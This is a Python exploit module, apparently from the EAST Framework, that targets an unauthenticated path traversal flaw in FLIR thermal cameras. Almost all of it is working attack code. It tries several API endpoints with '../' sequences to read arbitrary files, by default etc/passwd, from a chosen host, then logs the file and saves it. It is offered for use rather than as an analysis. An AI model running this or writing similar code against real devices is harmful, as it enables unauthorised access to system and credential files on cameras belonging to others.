#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_flir_thermal_camera_fd"
INFO['DESCRIPTION'] = "FLIR Thermal Camera F/FC/PT/D - Information Disclosure"
INFO['VENDOR'] = "http://www.flir.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42786/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Affected version: Firmware version: 8.0.0.64
                  Software version: 10.0.2.43
                  Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
                  FC-Series S (FC-334-NTSC)
                  FC-Series ID
                  FC-Series R
                  PT-Series (PT-334 200562)
                  D-Series
                  F-Series
Input passed thru several parameters is not properly verified before
being used to read files. This can be exploited by an unauthenticated attacker
to read arbitrary files from local resources.
"""

INFO['CHANGELOG'] = "27 Sep 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS['PATH'] = 'etc/passwd', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS['PATH']
        self.urls = None
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
        
        self.urls = ['api/xml?file=/',
        'api/xml?file=../../../../../../../../../',
        'api/file/download/',
        'api/file/content/',
        'api/server/videosnap?file=../../../../../../../../../']
    
    def make_url(self, path = ''):
        return 'http://{}:{}/{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        content = ''
        for url in self.urls:
            curl = self.make_url(url + self.path)
            self.log('Try to download file ' + self.path)
            try:
                fd = urllib2.urlopen(curl)
                content = fd.read()
                if content:
                    self.log('= File Content =')
                    self.log(content)
                    self.log('= End of File  =')
                    self.writefile(content)
                    self.finish(True)
            except Exception as e:
                self.log(e)
                
        self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
